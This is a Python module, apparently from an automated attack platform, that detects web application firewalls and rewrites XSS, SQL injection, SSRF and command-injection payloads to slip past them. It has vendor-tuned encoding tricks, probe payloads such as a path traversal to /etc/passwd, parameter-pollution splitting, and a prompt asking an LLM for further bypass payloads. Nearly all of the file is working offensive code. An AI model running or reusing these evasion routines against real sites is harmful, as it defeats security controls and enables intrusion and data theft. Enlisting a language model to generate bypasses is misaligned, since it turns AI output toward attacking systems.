"""
WAF Detection & Bypass Module

Detects WAF type and adapts payloads to bypass it.
Tools: wafw00f, custom detection, AI-powered mutation
"""
import asyncio
import re
import random
import urllib.parse

import httpx

from app.utils.tool_runner import run_command
from app.ai.llm_engine import LLMEngine
from app.utils.http_client import make_client


# WAF bypass encoding functions
class Encoders:
    @staticmethod
    def double_url_encode(payload: str) -> str:
        return urllib.parse.quote(urllib.parse.quote(payload))

    @staticmethod
    def unicode_encode(payload: str) -> str:
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"\\u{ord(char):04x}"
            else:
                result += char
        return result

    @staticmethod
    def html_entities(payload: str) -> str:
        result = ""
        for char in payload:
            if char.isalpha():
                result += f"&#{ord(char)};"
            else:
                result += char
        return result

    @staticmethod
    def case_swap(payload: str) -> str:
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            if c.isalpha() else c
            for c in payload
        )

    @staticmethod
    def comment_injection_sql(payload: str) -> str:
        """Insert SQL comments between keywords."""
        keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
        result = payload
        for kw in keywords:
            result = re.sub(
                rf"\b{kw}\b",
                "/**/".join(kw),
                result,
                flags=re.IGNORECASE,
            )
        return result

    @staticmethod
    def null_byte_inject(payload: str) -> str:
        return payload.replace(" ", "%00 ")

    @staticmethod
    def newline_inject(payload: str) -> str:
        return payload.replace(" ", "%0a ")

    @staticmethod
    def tab_inject(payload: str) -> str:
        """Replace spaces with tabs — bypasses space-based WAF rules."""
        return payload.replace(" ", "%09")

    @staticmethod
    def chunk_split(payload: str) -> str:
        """Split payload with chunk-style markers."""
        return "%0d%0a".join(payload[i:i+3] for i in range(0, len(payload), 3))

    @staticmethod
    def concat_bypass_sql(payload: str) -> str:
        """SQL keyword bypass via CONCAT and hex encoding."""
        replacements = {
            "UNION": "UN%69ON",
            "SELECT": "SE%6CECT",
            "FROM": "FR%4FM",
            "WHERE": "WH%45RE",
            "AND": "AN%44",
            "OR ": "%4FR ",
        }
        result = payload
        for k, v in replacements.items():
            result = re.sub(re.escape(k), v, result, flags=re.IGNORECASE)
        return result

    @staticmethod
    def hpp_duplicate(payload: str) -> str:
        """HTTP Parameter Pollution — duplicate parameter with split payload."""
        # This returns a marker; actual HPP is handled in adapt_payloads
        return payload

    @staticmethod
    def overlong_utf8(payload: str) -> str:
        """Overlong UTF-8 encoding bypass."""
        result = ""
        for char in payload:
            if char == "<":
                result += "%c0%bc"
            elif char == ">":
                result += "%c0%be"
            elif char == "'":
                result += "%c0%a7"
            elif char == '"':
                result += "%c0%a2"
            else:
                result += char
        return result

    @staticmethod
    def backslash_escape(payload: str) -> str:
        """MySQL backslash escaping bypass."""
        return payload.replace("'", "\\'").replace('"', '\\"')

    @staticmethod
    def js_string_fromcharcode(payload: str) -> str:
        """Convert XSS payload to String.fromCharCode — evades regex-based WAFs."""
        if "<script>" not in payload.lower() and "alert" not in payload.lower():
            return payload
        # Extract just the JS expression, wrap in fromCharCode
        codes = ",".join(str(ord(c)) for c in payload)
        return f"<img src=x onerror=eval(String.fromCharCode({codes}))>"

    @staticmethod
    def svg_event_handler(payload: str) -> str:
        """Convert XSS to SVG-based event handler — bypasses <script> filters."""
        if "<script>" not in payload.lower():
            return payload
        # Extract alert/JS code from script tags
        inner = re.sub(r'</?script[^>]*>', '', payload, flags=re.IGNORECASE).strip()
        return f'<svg onload="{inner}">'

    @staticmethod
    def js_template_literal(payload: str) -> str:
        """Use JS template literals to bypass quote filters."""
        if "alert" in payload:
            return "<img src=x onerror=alert`1`>"
        return payload

    @staticmethod
    def math_expression_sqli(payload: str) -> str:
        """Replace 1=1 with mathematical expression for SQLi."""
        return payload.replace("1=1", "1<2").replace("'1'='1'", "'a'<'b'")

    @staticmethod
    def json_content_type(payload: str) -> str:
        """Hint to use JSON content-type — many WAFs only inspect form data."""
        # This is a marker; actual content-type switching handled in exploit phase
        return f"JSON_CT:{payload}"

    @staticmethod
    def multipart_boundary(payload: str) -> str:
        """Hint to use multipart encoding — bypasses body inspection."""
        return f"MULTIPART:{payload}"

    @staticmethod
    def header_injection(payload: str) -> str:
        """Inject via X-Forwarded-For or other headers that bypass WAF."""
        return f"HEADER_INJECT:{payload}"

    @staticmethod
    def line_break_split(payload: str) -> str:
        """Split keywords across multiple lines — bypasses single-line regex."""
        keywords = ["script", "alert", "onerror", "onload", "SELECT", "UNION"]
        result = payload
        for kw in keywords:
            if kw.lower() in result.lower():
                idx = result.lower().find(kw.lower())
                mid = idx + len(kw) // 2
                result = result[:mid] + "\n" + result[mid:]
                break
        return result

    @staticmethod
    def ip_decimal_bypass(payload: str) -> str:
        """Convert SSRF IPs to decimal format — bypasses IP blocklists."""
        # 127.0.0.1 → 2130706433
        import re as _re
        ip_match = _re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', payload)
        if ip_match:
            a, b, c, d = [int(x) for x in ip_match.groups()]
            decimal_ip = (a << 24) + (b << 16) + (c << 8) + d
            return _re.sub(r'\d+\.\d+\.\d+\.\d+', str(decimal_ip), payload, count=1)
        return payload

    @staticmethod
    def ip_hex_bypass(payload: str) -> str:
        """Convert SSRF IPs to hex format."""
        import re as _re
        ip_match = _re.search(r'(\d+)\.(\d+)\.(\d+)\.(\d+)', payload)
        if ip_match:
            hex_ip = ".".join(f"0x{int(x):02x}" for x in ip_match.groups())
            return _re.sub(r'\d+\.\d+\.\d+\.\d+', hex_ip, payload, count=1)
        return payload

    @staticmethod
    def protocol_relative_url(payload: str) -> str:
        """Convert http:// to // — bypasses protocol-specific filters."""
        return payload.replace("http://", "//").replace("https://", "//")


class WAFModule:
    def __init__(self):
        self.llm = LLMEngine()
        self.encoders = Encoders()

    async def detect(self, domain: str) -> dict:
        """Detect WAF presence and type."""
        results = await asyncio.gather(
            self._wafw00f_detect(domain),
            self._custom_detect(domain),
            return_exceptions=True,
        )

        waf_info = {
            "detected": False,
            "waf_name": None,
            "waf_vendor": None,
            "bypass_difficulty": "unknown",
        }

        for result in results:
            if isinstance(result, dict) and result.get("detected"):
                waf_info.update(result)
                break

        return waf_info

    async def _wafw00f_detect(self, domain: str) -> dict:
        """Detect WAF using wafw00f."""
        try:
            target_url = self._base_url if hasattr(self, '_base_url') else f"https://{domain}"
            output = await run_command(
                ["wafw00f", target_url, "-o", "-"],
                timeout=30,
            )
            if output and "is behind" in output:
                # Parse WAF name
                match = re.search(r"is behind (.+?)(?:\s|$)", output)
                waf_name = match.group(1).strip() if match else "Unknown"
                return {
                    "detected": True,
                    "waf_name": waf_name,
                    "source": "wafw00f",
                }
        except Exception:
            pass
        return {"detected": False}

    async def _custom_detect(self, domain: str) -> dict:
        """Custom WAF detection via response analysis."""
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
            "AWS WAF": ["x-amzn-requestid", "awselb"],
            "Akamai": ["akamai", "x-akamai"],
            "Imperva/Incapsula": ["incap_ses", "visid_incap", "x-iinfo"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "Sucuri": ["sucuri", "x-sucuri"],
            "F5 BIG-IP": ["bigip", "x-wa-info"],
            "Barracuda": ["barra_counter_session"],
        }

        try:
            # Send a suspicious request to trigger WAF
            test_payloads = [
                "' OR 1=1--",
                "<script>alert(1)</script>",
                "../../etc/passwd",
            ]

            async with make_client() as client:
                # Normal request for baseline
                target_url = self._base_url if hasattr(self, '_base_url') else f"https://{domain}"
                normal = await client.get(target_url)
                normal_headers = {k.lower(): v.lower() for k, v in normal.headers.items()}

                # Check headers for WAF signatures
                all_headers = " ".join(f"{k}={v}" for k, v in normal_headers.items())
                for waf_name, signatures in waf_signatures.items():
                    for sig in signatures:
                        if sig.lower() in all_headers:
                            return {
                                "detected": True,
                                "waf_name": waf_name,
                                "source": "header_analysis",
                            }

                # Send malicious request and compare
                for payload in test_payloads:
                    try:
                        resp = await client.get(
                            f"{target_url}/?test={urllib.parse.quote(payload)}"
                        )
                        if resp.status_code in (403, 406, 429, 503):
                            return {
                                "detected": True,
                                "waf_name": "Unknown (blocked malicious request)",
                                "source": "behavior_analysis",
                                "block_status": resp.status_code,
                            }
                    except Exception:
                        continue

        except Exception:
            pass

        return {"detected": False}

    async def adapt_payloads(self, payloads: list[dict], waf_info: dict) -> list[dict]:
        """Adapt payloads to bypass detected WAF using vuln-type-specific strategies."""
        waf_name = waf_info.get("waf_name", "").lower()
        adapted = []

        # Base encoders (work for all vuln types)
        base_encoders = [
            self.encoders.double_url_encode,
            self.encoders.case_swap,
            self.encoders.tab_inject,
        ]

        # XSS-specific encoders
        xss_encoders = [
            self.encoders.html_entities,
            self.encoders.js_string_fromcharcode,
            self.encoders.svg_event_handler,
            self.encoders.js_template_literal,
            self.encoders.overlong_utf8,
            self.encoders.unicode_encode,
        ]

        # SQLi-specific encoders
        sqli_encoders = [
            self.encoders.comment_injection_sql,
            self.encoders.concat_bypass_sql,
            self.encoders.math_expression_sqli,
            self.encoders.null_byte_inject,
            self.encoders.newline_inject,
            self.encoders.backslash_escape,
        ]

        # SSRF-specific encoders
        ssrf_encoders = [
            self.encoders.ip_decimal_bypass,
            self.encoders.ip_hex_bypass,
            self.encoders.protocol_relative_url,
            self.encoders.double_url_encode,
        ]

        # WAF-specific priority adjustments
        if "cloudflare" in waf_name:
            base_encoders = [self.encoders.double_url_encode, self.encoders.unicode_encode,
                             self.encoders.case_swap, self.encoders.tab_inject]
        elif "akamai" in waf_name:
            base_encoders = [self.encoders.null_byte_inject, self.encoders.double_url_encode,
                             self.encoders.newline_inject, self.encoders.overlong_utf8]
        elif "imperva" in waf_name or "incapsula" in waf_name:
            base_encoders = [self.encoders.chunk_split, self.encoders.double_url_encode,
                             self.encoders.tab_inject, self.encoders.case_swap]
        elif "modsecurity" in waf_name:
            base_encoders = [self.encoders.overlong_utf8, self.encoders.null_byte_inject,
                             self.encoders.unicode_encode, self.encoders.newline_inject]
        elif "f5" in waf_name or "big-ip" in waf_name:
            base_encoders = [self.encoders.double_url_encode, self.encoders.tab_inject,
                             self.encoders.case_swap, self.encoders.chunk_split]

        for payload_data in payloads:
            original = payload_data.get("payload", "")
            if not original:
                continue
            vtype = payload_data.get("vuln_type", "").lower()

            # Keep original
            adapted.append(payload_data)

            # Select encoders based on vuln type
            if vtype in ("xss", "xss_reflected", "xss_stored", "xss_dom"):
                encoders = base_encoders + xss_encoders
            elif vtype in ("sqli", "sqli_blind", "nosql_injection"):
                encoders = base_encoders + sqli_encoders
            elif vtype in ("ssrf",):
                encoders = ssrf_encoders + base_encoders
            elif vtype in ("ssti", "cmd_injection"):
                encoders = base_encoders + [
                    self.encoders.null_byte_inject,
                    self.encoders.newline_inject,
                    self.encoders.unicode_encode,
                ]
            else:
                encoders = base_encoders

            # Generate encoded variants
            seen = {original}
            for encoder in encoders:
                try:
                    encoded = encoder(original)
                    if encoded and encoded not in seen:
                        seen.add(encoded)
                        new_payload = payload_data.copy()
                        new_payload["payload"] = encoded
                        new_payload["encoding"] = encoder.__name__
                        new_payload["waf_bypass"] = True
                        adapted.append(new_payload)
                except Exception:
                    continue

            # HTTP Parameter Pollution: split payload across duplicate params
            if payload_data.get("params"):
                param = payload_data["params"][0] if isinstance(payload_data["params"], list) else payload_data["params"]
                if len(original) > 6:
                    mid = len(original) // 2
                    hpp_payload = payload_data.copy()
                    hpp_payload["payload"] = original[:mid]
                    hpp_payload["hpp_extra"] = {param: original[mid:]}
                    hpp_payload["encoding"] = "hpp_split"
                    hpp_payload["waf_bypass"] = True
                    adapted.append(hpp_payload)

        # Use AI to generate additional WAF-specific bypass payloads
        try:
            ai_bypasses = await self._ai_generate_bypasses(waf_name, payloads[:5])
            adapted.extend(ai_bypasses)
        except Exception:
            pass

        return adapted

    async def _ai_generate_bypasses(self, waf_name: str, sample_payloads: list[dict]) -> list[dict]:
        """Use AI to generate WAF-specific bypass payloads."""
        vuln_types = set(p.get("vuln_type", "xss") for p in sample_payloads)

        prompt = f"""Generate 10 advanced WAF bypass payloads for {waf_name} WAF.

Vulnerability types to bypass for: {', '.join(vuln_types)}

Original payloads being blocked:
{[p['payload'] for p in sample_payloads[:5]]}

Use techniques like:
- Double encoding
- Unicode normalization bypass
- HTTP parameter pollution
- Chunked transfer
- Case manipulation
- Comment injection
- Null byte injection
- Content-type tricks

Respond as JSON array of objects:
[{{"vuln_type": "type", "payload": "the payload", "technique": "bypass technique used"}}]"""

        try:
            result = await self.llm.analyze(prompt)
            import json
            if "```" in result:
                result = result.split("```")[1].split("```")[0]
                if result.startswith("json"):
                    result = result[4:]
            ai_payloads = json.loads(result.strip())

            adapted = []
            for p in ai_payloads:
                adapted.append({
                    "vuln_type": p.get("vuln_type", "xss"),
                    "payload": p.get("payload", ""),
                    "target_url": sample_payloads[0].get("target_url", ""),
                    "params": sample_payloads[0].get("params", []),
                    "method": "GET",
                    "encoding": f"ai_bypass_{p.get('technique', 'unknown')}",
                    "waf_bypass": True,
                })
            return adapted
        except Exception:
            return []
